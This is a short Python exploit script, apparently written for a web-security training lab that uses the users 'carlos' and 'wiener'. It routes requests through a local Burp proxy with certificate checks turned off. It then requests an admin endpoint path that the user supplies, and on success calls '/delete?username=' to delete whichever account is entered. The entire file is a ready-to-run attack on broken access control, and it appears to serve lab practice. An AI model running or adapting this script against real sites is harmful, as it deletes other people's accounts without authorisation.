#!/usr/bin/python3
# Here some imports such as requests to make http request and handle response
import requests
import sys
import urllib3

# ignore urllib3 exceptions
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def do_get_request(url_to_exploit):
    get_request = requests.get(url_to_exploit, verify=False, proxies=proxies)
    if get_request.status_code == 200:
        print("[+] {} found.".format(url_to_exploit))
        print("[*] deleting carlos.")
        username = input("[*] enter the name of the user want to delete eg wiener or carlos.")
        deleting_request = requests.get(url_to_exploit + "/delete?username=" + username, verify=False, proxies=proxies)
        if deleting_request.status_code == 200:
            print("[++] done and the user was deleted")
        else:
            print("[-] couldn't delete that user")
    else:
        print("[-] couldn't find that endpoint")


def delete_carlos(url):
    url_to_exploit = input("[*] please enter the path of the vulnerable endpoint ")
    methode_request = input("[*] please enter the method of the request GET/POST ... ")
    if methode_request == "GET":
        do_get_request(url + "/" + url_to_exploit)


def exploit():
    if len(sys.argv) != 2:
        print("[-] Unexpected error occur")
        print("[*] Usage of the script is: {} <your url>".format(sys.argv[0]))
        exit(-1)
    url = sys.argv[1]
    delete_carlos(url)


if __name__ == "__main__":
    exploit()
